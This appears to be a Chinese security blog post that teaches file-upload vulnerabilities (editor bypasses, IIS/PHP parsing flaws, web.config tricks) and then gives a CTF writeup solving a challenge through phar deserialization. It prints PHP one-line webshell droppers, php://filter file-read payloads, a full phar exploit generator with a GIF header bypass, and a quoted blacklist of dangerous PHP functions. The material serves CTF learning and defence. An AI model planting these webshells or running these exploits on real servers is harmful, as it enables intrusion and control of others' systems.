在高版本 fck 中，直接上传或抓包修改文件名 “a.asp;.jpg”，都会将前面的点变成下划线，也就是变成 “a_asp;.jpg”，这样我们的文件名解析就无效果了。绕过方法是突破建立文件夹，其实质是利用我们 IIS6.0 的目录解析。

假设路径为 “/fckeditor/editor/filemanager/connectors/test.html”，文件名中包含“fck”，可以直接判定为 FCK 编辑器。在 FCKeditor 中选中“a.asp;.png” 并成功上传，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CccmKWnSKTfql4DdMLKbpkP4IInEpmBeicguumaOKuriaRp5H3pA5SiaWyg/640?wx_fmt=png)  
打开服务器，可以看到成功上传的图片文件。它名字被修改为 “a_asp;.png”，这就是 FCK 高版本的过滤，它将“.” 修改为“_”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc5dwRnAficgR6c4Pd1DhmITtk7BOdefBKWibD9AjxSWKDqrtibE26wPcGQ/640?wx_fmt=png)

eWebEditor 编辑器漏洞  
eWeb 编辑器需要登录后台，其默认数据库地址是：ewebeditor/db/ewebeditor.mdb，利用 eweb 遍历漏洞遍历文件目录、查看整个网站结构及敏感信息，比如：ewebeditor/admin_uploadfile.asp?id=14&dir=./。

③ IIS 高版本上传–畸形解析漏洞  
前面讲述的 IIS6.0 毕竟是一个低版本，除了靶场和僵尸站很少能够遇到。下面讲解高版本漏洞。

*   畸形解析漏洞影响版本  
    IIS7、IIS7.5、Nginx<0.8.03
    
*   漏洞产生条件  
    开启 Fast-CGI 或 php 配置文件中 cgi.fix_pathinfo。
    
*   漏洞产生原因  
    其漏洞不是 IIS 本身的问题，而是 PHP 配置不当造成的问题，根本原因是开启了 cgi.fix_pathinfo 选项。由于该漏洞是 php 配置造成，并且默认开启该功能，所以它影响了 IIS7、IIS7.5、IIS8.5 等多个版本，凡是 IIS+PHP 都有可能会有这个漏洞。
    
*   漏洞利用方法  
    当我们上传一张名为 “1.jpg” 的图片文件，并且这张图片文件里包含以下代码。那么它会生成一个叫 shell.php 的脚本文件，并写入我们的一句话，密码为 cmd。而一句话的位置是：上传的图片文件名字 “/shell.php”。如果图片没有被改名，那么现在我们的一句话文件在“1.jpg/shell.php” 中。
    

```
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>'); ?>
```

接着我们演示另一个代码，将 “1.jpg” 内容修改如下，直接写入 shell。

```
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>'); ?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcbtArQju8zb5InW0L0pkLT6iaFTH2n4dcZn8lOyneAJ5icy5zWGl431dQ/640?wx_fmt=png)

访问 “/1.jpg/shell.php” 显示的内容为空。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcfG4ahlhia8avUtDO1mXD91FeMvDAdMHV3zSziazeOIRuUvXJQ1DmUjnA/640?wx_fmt=png)

但是此时会在服务器生成一个名为 “shell.php” 的文件，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcMsnWoibIAvaUkc5vM8BzyNYrIPyb3fRF0LrF8mWO7Y02491kGDnczJw/640?wx_fmt=png)

并且 “shell.php” 包含了我们的一句话木马，这样通过 Caidao 即可访问该页面，并获取服务器的文件目录。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CceG07XvmBsuVuF9FEpc4bxNLIT81HQh1eX8Jmxib7iaFv7uRTYXF5VKog/640?wx_fmt=png)

使用该方法我们尝试插入一句话木马，很幸运我们的图片是成功上传了。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcafU2L0aib54BcbBBNHGUjv6BNbyRia53uys6iaQPH6SdSuQMSJoibF5TYw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcCjUiaEL4yJicLbuhvaibEkiberHticczYzKwqS4cSiaUpn1ibMGKBz3BNib15w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcCib7pLGK3sym2vo22YXw3LBM0mA8q48FicicwEecuWSYwy09pPrFicXISg/640?wx_fmt=png)

但遗憾的是，并没有生成 shell.php 文件，并且提示：

*   The requested URL /upload/0835ddbdeff6aa  
    08c9b7804a24dc203e/gif-ma04.gif/shell.php was not found on this server.
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcNUSCoNPrMT33qgk97ibMNOm9CzD9sFuYU4hCS63aauF3Z4Qd4VKRtTw/640?wx_fmt=png)

④ aspx 漏洞  
aspx 它有一个 “web.config” 的配置文件，它规定我们上传文件的后缀。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcibDZlpAzYxHoRbmLjCia70aPSWehPd9VUlIiaG0xhSedibrlyNMA2HNQ0Q/640?wx_fmt=png)

我们可以自定一个后缀名来解析 aspx 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcKXyjx0Vib1ojtl6rVqBV5GZVfKICr0gcDNiaUmzBQKjfObUh35QkEVFA/640?wx_fmt=png)

换句话说，当我们遇到可以上传配置文件的时候，则上传我们修改好的配置文件，然后自定义一个后缀名如 “.ad”，从而绕过 WAF 或检测，上传成功之后它会解析成 aspx 并执行。如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcNa8sepaQuHOiabQvDMcXNOYFFZZH4XOHIh8K7C0oica68N8Qzic6jqtuw/640?wx_fmt=png)

所以，当我们遇到可以上传配置文件的时候，通过该方法实现绕过，从而提权。

失败： 非常遗憾，我们通过下面的代码也没有成功。

```
<?php fputs(fopen('shell.php','w'),'<?php @assert($_POST[whuctf]); ?>'); ?>
```

哎，尝试了很多方法都没成功，自己还是太菜了！但希望这部分文件上传漏洞和一句话木马的总结希望您喜欢。大家有好的解决方法也可以告知我，接下来我们回到题目 “easy_unserialize”，那可能需要反序列化解决。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CceEVk7Qk65FIpuKGluBPOJrqDMH5AeErzXOkrCwRRxM3fdEicNQj7LZA/640?wx_fmt=png)

三. WP 解题思路
==========

下面我分享 52hertz 大佬的解题思路，并结合自己的经验总结。本题考查的上传 phar 触发反序列化，同时参考创宇 404 实验室的文章。

(1) 通过分析主页源码，发现 upload 和 view 两个对话框包括关键字段 name=“acti0n”，抓包可以看到? acti0n=upload 的访问方式，这是一个文件包含的漏洞点。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccib0RFib8UbIp7u7yLJ42qHgicuM1usRupyLhrhawnRiaicLnAQgBBlWGtyg/640?wx_fmt=png)

(2) 通过设置 “acti0n” 参数和 filter 过滤访问 upload.php 和 view.php 页面，同时进行 base64 大写过滤。

*   ?acti0n=php://filter/  
    convert.basE64-encode/resource=upload.php
    
*   ?acti0n=php://filter/  
    convert.basE64-encode/resource=view.php
    

> 推荐作者上一篇文章的文件包含漏洞  
> 文件包含漏洞是指通过 PHP 函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。当 php://filter 与包含函数结合时，php://filter 流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行，从而导致任意文件读取。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcZCvVGEO0IDZWmetPkWiaIuw9Fq5W2WiaePUv7F3K8oFa0p0jqmiadKLxA/640?wx_fmt=png)

upload.php 在线 base64 解码如下所示，没有什么利用的点。

```
<!DOCTYPE html><link type = "text/css" rel = "stylesheet" href = "css/style.css"><html lang = "zh"><head>	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />	<title>上传图片</title></head><body>		<script type = "text/javascript" color = "0,0,255" opacity = '0.7' zIndex = "-2" count = "99" src = 'js/canvas-nest.min.js'></script> <!-- 动态背景 -->	<br><br><br>	<h2>上传你手里最好的图片!</h2>	<p id = "comment">If it is excellent enough, you will get the flag!</p>	<br><br><br>	<div class = "form1">		<form action = "upload.php" method = "post" accept-charset = "utf-8" enctype = "multipart/form-data">			<label name = "title" for = "file">图片:   </label>			<input type = "file" name = "file" id = "file">			<input type = "submit" class = "button" name = "submit" value = "上传">		</form>	</div>	</body></html><?php 	error_reporting(0);	$dir = 'upload/'.md5($_SERVER['REMOTE_ADDR']).'/';	if(!is_dir($dir)) {		if(!mkdir($dir, 0777, true)) {			echo error_get_last()['message'];			die('Failed to make the directory');		}	}	chdir($dir);	if(isset($_POST['submit'])) {		$name = $_FILES['file']['name'];		$tmp_name = $_FILES['file']['tmp_name'];		$ans = exif_imagetype($tmp_name);		if($_FILES['file']['size'] >= 204800) {			die('filesize too big.');		}		if(!$name) {			die('filename can not be empty!');		}		if(preg_match('/(htaccess)|(user)|(\.\.)|(%)|(#)/i', $name) !== 0) {			die('Hacker!');		}		if(($ans != IMAGETYPE_GIF) && ($ans != IMAGETYPE_JPEG) && ($ans != IMAGETYPE_PNG)) {			$type = $_FILES['file']['type'];			if($type == 'image/gif' or $type == 'image/jpg' or $type == 'image/png' or $type == 'image/jpeg') {				echo "<p align=\"center\">Don't cheat me with Content-Type!</p>";			}			echo("<p align=\"center\">You can't upload this kind of file!</p>");			exit;		}		$content = file_get_contents($tmp_name);		if(preg_match('/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i', $content) !== 0) {			echo('<script>alert("You could not upload this image because of some dangerous code in your file!")</script>');			exit;		}				$extension = substr($name, strrpos($name, ".") + 1);		if(preg_match('/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i', $extension) === 0) {			die("<p align=\"center\">You can't upload this kind of file!</p>");		} 		$upload_file = $name;		move_uploaded_file($tmp_name, $upload_file);		if(file_exists($name)) {			echo "<p align=\"center\">Your file $name has been uploaded.<br></p>";		} else {			echo '<script>alert("上传失败")</script>';		}		echo "<p align=\"center\"><a href=\"view.php\" >点我去看上传的文件</a></p>";		#header("refresh:3;url=index.php");	} ?>
```

访问 view.php 页面如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcIMcviavGfkeGSP2TiazZiaHXvndU8yXx6q94VWnVqo2wgBm1BNzDVjuRg/640?wx_fmt=png)

view.php 在线 base64 解码如下所示：

```
<!DOCTYPE html><html lang="zh"><head>	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />	<title>查看图片</title>	<link type = "text/css" rel = "stylesheet" href = "css/style.css"></head><body>	<script type = "text/javascript" color = "0,0,255" opacity = '0.7' zIndex = "-2" count = "99" src = 'js/canvas-nest.min.js'></script> <!-- 动态背景 -->	<?php	#include_once "flag.php"; 	error_reporting(0);	class View	{		public $dir;		private $cmd;		function __construct()		{			$this->dir = 'upload/'.md5($_SERVER['REMOTE_ADDR']).'/';			$this->cmd = 'echo "<div style=\"text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\">Powered by: xxx</div>";';			if(!is_dir($this->dir)) {				mkdir($this->dir, 0777, true);			}		}		function get_file_list() {			$file = scandir('.');			return $file;		}		function show_file_list() {			$file = $this->get_file_list();			for ($i = 2; $i < sizeof($file); $i++) { 				echo "<p align=\"center\" style=\"font-weight: bold;\">[".strval($i - 1)."]  $file[$i] </p>";			}		}		function show_img($file_name) {			$name = $file_name;			$width = getimagesize($name)[0];			$height = getimagesize($name)[1];			$times = $width / 200;			$width /= $times;			$height /= $times;			$template = "<img style=\"clear: both;display: block;margin: auto;\" src=\"$this->dir$name\" alt=\"$file_name\" width = \"$width\" height = \"$height\">";			echo $template;		}		function delete_img($file_name) {			$name = $file_name;			if (file_exists($name)) {				@unlink($name);				if(!file_exists($name)) {					echo "<p align=\"center\" style=\"font-weight: bold;\">成功删除! 3s后跳转</p>";					header("refresh:3;url=view.php");				} else {					echo "Can not delete!";					exit;				}			} else {				echo "<p align=\"center\" style=\"font-weight: bold;\">找不到这个文件! </p>";			}		}		function __destruct() {			eval($this->cmd);		}	}		$ins = new View();	chdir($ins->dir);	echo "<h3>当前目录为 " . $ins->dir . "</h3>";	$ins->show_file_list();	if (isset($_POST['show'])) {		$file_name = $_POST['show'];		$ins->show_img($file_name);	}	if (isset($_POST['delete'])) {		$file_name = $_POST['delete'];		$ins->delete_img($file_name);	}	unset($ins);	?></body></html>
```

(3) 简单的审计一下两份功能代码，upload.php 中没有什么利用点，就是上传文件与拦截过滤了一些危险函数。关键点在 view.php 中，view.php 里面有很显然的 eval()，只要修改类中的私有变量 $cmd 就可以拿到 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcgfUn4h4PsG1vwH0mID5tpqAwRmj55NGibOnxOxmSf5pPzjJ0nO768icg/640?wx_fmt=png)

这里有一个 file_exists 函数可以利用，而且最后还会进行代码执行。请参考 创宇 404 实验室 的文章（详见后参考文献），利用 phar 反序列化漏洞进行攻击，该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize()直接进行反序列化操作。这让一些看起来 “人畜无害” 的函数变得“暗藏杀机”，这里利用的就是 file_exists 函数触发该漏洞。

(4) 我们看到 upload.php 中的黑名单如下，想办法用 show_source() 函数读取 flag.php 文件，而且 phar 可以直接上传。

*   if(preg_match(’/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i’, $content) !== 0) {  
    echo(’< script>alert(“You could not upload this image because of some dangerous code in your file!”)</ script>’);
    

构造的 exp 模板代码如下，并且增加绕过 gif 文件头的限制。

```
<?php    class View    {        public $dir;        private $cmd;        function __construct()        {            $this->cmd = 'show_source("flag.php");';        }        function __destruct() {            eval($this->cmd);        }    }    $phar = new Phar('phar.phar');    $phar -> startBuffering();    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>'); //设置stub 增加gif文件头    $phar ->addFromString('test.txt','test'); //添加要压缩的文件    $object = new View();    $phar -> setMetadata($object); //将自定义meta-data存入manifest    $phar -> stopBuffering();  ?>
```

(5) 本地运行上面的 exp.php 文件会生成 phar 文件，然后直接上传。  
注意：要将 php.ini 中的 phar.readonly 选项设置为 Off，否则无法生成 phar 文件，并报错。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccvgicau6Y4iaaicNkibibHs06OsMomcqzibu4IicL7rFfKtl6npz9wvv2DMe8A/640?wx_fmt=png)

生成的 phar.phar 文件如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc6s3vRKZSKAB6xGo41FzRq4qaqXUswxt4RMgRQ9ml7SzMLvFMgfKTzQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcZEMlnlueVN7DFjML1I35oA1U01wZIiafZoxhGG17enP9VEquQGrSLibA/640?wx_fmt=png)

(6) 文件上传成功之后，通过 delete 这个参数来触发 file_exists 才可以利用 phar，因此构造参数 detele=phar://phar.phar 包含一下，再发送 post 命令即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcdSDVFEfibDmSHmQND9aIRV9fLXP9ffNLu0HUrj2f7UKWwV6vFmiazsYQ/640?wx_fmt=png)

注意，居然能上传 phar 文件，如果不知道该知识点或获取 upload.php 及 view.php 源码，还真不一定能成功。同时，在上传类型文件检测时，是通过添加 GIF89a 绕过的。

最终获得 flag 值为 WHUCTF{Phar_1s_Very_d@nger0u5}。同时，还有许多函数都可以触发 phar，getimagesize 同样可以触发；而文件后缀也不一定要是 phar, 只要使用 phar 协议就可以。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CczIFct2rao0rVoKp2lGO5xjeQW2ibYEdWWRy7UEHZicU96ZW2F9C5nYaQ/640?wx_fmt=png)

Wordpress 是网络上最广泛使用的 CMS，它也存在这个漏洞，并且该漏洞在 2017 年 2 月份就报告给了官方，但至今仍未修补。之前的任意文件删除漏洞也是出现在这部分代码中，同样没有修补，如下图所示 wpnonce 值可在修改页面中获取。具体过程请参考 404 实验室。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcBugseAicd8icYpY2Ipib7j0ohUL1t0K4teD5JxedgABqddtzRquQAWV8w/640?wx_fmt=png)

四. 总结
=====

写到这里，这篇文章就介绍完毕，详细讲解了文件上传漏洞和一句话，最后的解决方法也是我没有想到的，希望对您有所帮助。

学安全近一年，认识了很多安全大佬和朋友，希望大家一起进步。这篇文章中如果存在一些不足，还请海涵。作者作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，感谢师傅们的教导。

深知自己很菜，得努力前行。2020 年 5 月第一次参加 CTF 比赛写的。这半年来，原创博客越来越少，希望自己能在博士路上不断前行，多读论文，多写论文，多学新知识。加油！也祝所有在读博士都学有所成，勿忘来时的路，砥砺前行。最后还是那句话，人生路上，好好享受陪伴家人的日子，爱你们~

*   **一. Easy_unserialize 题目描述**
    
*   **二. 作者解题思路及总结**
    
    1. 一句话和冰蝎蚁剑
    
    2. 图片一句话
    
    3. 过狗一句话绕过限制
    
    4.BurpSuite 文件上传漏洞的常用方法
    
*   **三. WP 解题思路**
    
*   **四. 总结**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcWy3dEB8LQkUscNwUmibTiboz52ZSxlDqPUbYc8P0qlHO3wbm8dtOptKQ/640?wx_fmt=png)

CTF 初学者个人建议：  

*   多做 CTF 题目，多参加 CTF 比赛，多交流经验
    
*   CTF 题目推荐 BUUCTF，比赛每个月都有很多，大赛小赛，比如 XCTF、KCTF、WCTF 等
    
*   每个优秀的 CTF 选手都有自己的工具库、脚本库、词典库
    
*   多向优秀的安全团队学习，关注他们的公众号，甚至加好友，组队比赛
    
*   CTF 比赛对找工作有帮助，但后续建议和漏洞挖掘实际工作结合起来
    

**天行健，君子以自强不息。  
地势坤，君子以厚德载物。**

真诚地感谢您关注 “娜璋之家” 公众号，也希望我的文章能陪伴你成长，希望在技术路上不断前行。文章如果对你有帮助、有感悟，就是对我最好的回报，且看且珍惜！再次感谢您的关注，也请帮忙宣传下“娜璋之家”，初来乍到，还请多指教。  

公众号

(By: Eastmount 2021-06-04 夜于武汉)  

参考文献：

*   文件上传漏洞和 Caidao 入门及防御原理（一）
    
*   文件上传漏洞和 IIS6.0 解析漏洞及防御原理（二）
    
*   文件上传漏洞、编辑器漏洞和 IIS 高版本漏洞及防御（三）
    
*   文件上传漏洞之 Upload-labs 靶场及 CTF 题目 01-10（四）
    
*   文件上传漏洞之绕狗一句话原理和绕过安全狗（六）
    
*   利用 phar 拓展 php 反序列化漏洞攻击面 - 创宇 404 实验室
    
*   四个实例递进 php 反序列化漏洞理解 - 大方子
    
*   WHUCTF2020 Writeup - 52hertz 师傅
    
*   WHUCTF 官方 WP - 师傅们 php 一句话木马 - 慕尘师傅
    
*   一句话木马踩坑记 - fz41 师傅
    
*   PHP 反序列化漏洞简介及相关技巧小结 - FB
    

前文分享（下面的超链接可以点击喔）：

*   [[网络安全] 一. Web 渗透入门基础与安全术语普及](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483786&idx=1&sn=d9096e1e770c660c6a5f4943568ea289&chksm=cfccb147f8bb38512c6808e544e1ec903cdba5947a29cc8a2bede16b8d73d99919d60ae1a8e6&scene=21#wechat_redirect)
    
*   [[网络安全] 二. Web 渗透信息收集之域名、端口、服务、指纹、旁站、CDN 和敏感信息](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483849&idx=1&sn=dce7b63429b5e93d788b8790df277ff3&chksm=cfccb104f8bb38121c341a5dbc2eb8fa1723a7e845ddcbefe1f6c728568c8451b70934fc3bb2&scene=21#wechat_redirect)
    
*   [[网络安全] 三. 社会工程学那些事及 IP 物理定位](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483994&idx=1&sn=1f2fd6bea13365c54fec8e142bb48e1d&chksm=cfccb297f8bb3b8156a18ae7edaba9f0a4bd5e38966bdaceeff03a5759ebd216a349f430f409&scene=21#wechat_redirect)
    
*   [[网络安全] 四. 手工 SQL 注入和 SQLMAP 入门基础及案例分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484068&idx=1&sn=a82f3d4d121773fdaebf1a11cf8c5586&chksm=cfccb269f8bb3b7f21ecfb0869ce46933e236aa3c5e900659a98643f5186546a172a8f745d78&scene=21#wechat_redirect)
    
*   [[网络安全] 五. XSS 跨站脚本攻击详解及分类 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484381&idx=1&sn=a1d459a7457b56b02e217f39e5161338&chksm=cfccb310f8bb3a06442b001fc7b38a0363b9fbd4436f450b0ce6fa2eeb5c796fc936ceb5d6fa&scene=21#wechat_redirect)
    
*   [[网络安全] 六. XSS 跨站脚本攻击靶场案例九题及防御方法 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485174&idx=1&sn=245b812489c845e875cf4bc4763747b7&chksm=cfccb63bf8bb3f2d537f36093de80dbeed5a340b141001d3ef8a9ac9d6336e0aaf62b013a54c&scene=21#wechat_redirect)
    
*   [[网络安全] 七. Burp Suite 工具安装配置、Proxy 基础用法及暴库入门](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485381&idx=1&sn=9a0230cf22eba0a24152cb0e73a37224&chksm=cfccb708f8bb3e1ecf68078746521191921f41d19a0b82cb3f097856dad7a85c4d9c34750b3f&scene=21#wechat_redirect)
    
*   [[网络安全] 八. Web 漏洞及端口扫描之 Nmap、ThreatScan 和 DirBuster](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485437&idx=1&sn=2a7179464207fa68b708297ec0db6f00&chksm=cfccb730f8bb3e2629edb5ca114de79723e323512be9538a4d512297f8728a3a9d7718389b60&scene=21#wechat_redirect)
    
*   [[网络安全] 九. Wireshark 安装入门及抓取网站用户名密码 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485465&idx=1&sn=8e7f1f5790bfe754affe0599a3fce1ee&chksm=cfccb8d4f8bb31c2ca36f6467d700f4e4d7821899a6d5173ac0b525f0f6227c8392252b5c775&scene=21#wechat_redirect)
    
*   [[网络安全] 十. Wireshark 抓包原理、ARP 劫持、MAC 泛洪及数据追踪](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485551&idx=1&sn=15f00e14f4376e179a558444de8ef0a5&chksm=cfccb8a2f8bb31b456499a937598e750661841b5ca166a12073e343a049737fa3131fd422dc5&scene=21#wechat_redirect)
    
*   [[网络安全] 十一. Shodan 搜索引擎详解及 Python 命令行调用](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485599&idx=1&sn=0c60c042911fc79287417c2385550430&chksm=cfccb852f8bb3144a89f6b0d0df6c185a208aa989d98f8c7e3b7d741dedc371b3ecb4e70a747&scene=21#wechat_redirect)
    
*   [[网络安全] 十二. 文件上传漏洞 (1) 基础原理及 Caidao 入门知识](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485787&idx=1&sn=0c75cf81c4234031273bced4dff0b25c&chksm=cfccb996f8bb3080fe9583043b43665095fd6935a4147a2bb0d1ab9b91a6cde99da4747c5201&scene=21#wechat_redirect)
    
*   [[网络安全] 十三. 文件上传漏洞 (2) 常用绕过方法及 IIS6.0 解析漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485833&idx=1&sn=a613116633338ca85dfd1966052b0b02&chksm=cfccb944f8bb305296a32dac7f0942e727d66dc9f710bfb82c3597500e97d39714ecd2ed18cf&scene=21#wechat_redirect)
    
*   [[网络安全] 十四. 文件上传漏洞 (3) 编辑器漏洞和 IIS 高版本漏洞及防御](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485871&idx=1&sn=e6d0248e483dea9616a5d615f852eccb&chksm=cfccb962f8bb3074516c1ef8e01c7cb00a174fa5b1a51de3a49b13fd8c7846deeaf6d0e24480&scene=21#wechat_redirect)
    
*   [[网络安全] 十五. 文件上传漏洞 (4)Upload-labs 靶场及 CTF 题目 01-10](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488340&idx=1&sn=5b7bf5602294586f819340bd6190a34d&chksm=cfcca399f8bb2a8f746fc09c7142facc8ea17c008ba46dee423b90ff6abb3cd4486edf52d201&scene=21#wechat_redirect)
    
*   [[网络安全] 十六. 文件上传漏洞 (5) 绕狗一句话原理和绕过安全狗](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488396&idx=1&sn=67c1b13f041040c09c236bba99edfe0a&chksm=cfcca341f8bb2a5729778490db7441a4ddfdfa05dcc5f6322b4860db7780056f9f05f5bc0b3d&scene=21#wechat_redirect)  
    
*   [[网络安全] 十八. Metasploit 技术之基础用法万字详解及 MS17-010 漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488255&idx=1&sn=28b1f54fd420a0145cb95b842a36c567&chksm=cfcca232f8bb2b243bf4cbf5c1741c6af2c1fc666985d34b4f6b4a6ee3161d18975bb5ea18fc&scene=21#wechat_redirect)
    
*   [[网络安全] 十九. Metasploit 后渗透技术之信息收集和权限提权](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488639&idx=1&sn=dddd54eb0ba7cfdf71113a1f4a5c6548&chksm=cfcca4b2f8bb2da44c975ca12f16b4b76af351be4711ac7e77ca8622450a15c3af0172be3f9e&scene=21#wechat_redirect)
    
*   [[网络安全] 二十. Metasploit 后渗透技术之移植漏洞、深度提权和后门](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488738&idx=1&sn=8106362219d99ae6deb8aeca1f6b1dff&chksm=cfcca42ff8bb2d397c44b839700d92fd22e4ac60c403b96cba734bc523cb258dbd0db5309952&scene=21#wechat_redirect)
    
*   [[网络安全] 二十一. Chrome 密码保存渗透解析、Chrome 蓝屏漏洞及音乐软件漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488883&idx=1&sn=65c362cc4c3958aa747716d17b29eeb3&chksm=cfcca5bef8bb2ca895525a1964425d1dfe74001a33e3b59b18bf902539cfc4d941dd96c33863&scene=21#wechat_redirect)
    
*   [[网络安全] 二十二. Powershell 基础入门及常见用法 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489093&idx=1&sn=216374f1db9af3e1bb4f9431b66237a3&chksm=cfcca688f8bb2f9e9fc25c1d1e21d3bceae0a9ff026f57e6e6df2ffa20597aa8356c15ea2280&scene=21#wechat_redirect)
    
*   [[网络安全] 二十三. Powershell 基础入门之常见语法及注册表操作 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489150&idx=1&sn=969db0e97868fe64fb03776b77bf7d13&chksm=cfcca6b3f8bb2fa56d2c9e4b2bdbd5abcc04ee724ee6cd2abbb059fca9ae65d6595ca98c2624&scene=21#wechat_redirect)
    
*   [[网络安全] 二十四. Web 安全学习路线及木马、病毒和防御初探](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489258&idx=1&sn=0fcfeb9555982c10eca90d2a78c5b58f&chksm=cfcca627f8bb2f315c8b089fcbeded22ab3515980a618857349e606e049d6a8d73bf79743ffe&scene=21#wechat_redirect)
    
*   [[网络安全] 二十五. 虚拟机 VMware+Kali 安装入门及 Sqlmap 基本用法](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489455&idx=1&sn=3835d420386dfb1df32f0f550f21b0d8&chksm=cfcca762f8bb2e7493a99415b19145f8c35b9af19dd6904511d525485fb9f98e310eb12e3054&scene=21#wechat_redirect)
    
